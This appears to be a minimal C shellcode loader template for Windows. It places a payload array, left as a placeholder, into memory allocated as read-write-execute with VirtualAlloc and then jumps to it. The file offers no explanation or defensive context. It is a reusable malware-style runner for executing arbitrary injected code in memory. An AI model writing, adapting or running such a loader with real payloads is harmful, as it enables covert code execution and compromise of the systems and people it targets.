#include <stdio.h>
#include <windows.h>
#include <string.h>

unsigned char shellcode[] = <SHELLCODE_TO_REPLACE>;
int shellcode_size = sizeof(shellcode);

int main()
{
	void *exec = VirtualAlloc(0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, shellcode_size);
	((void(*)())exec)();

	return 0;
}
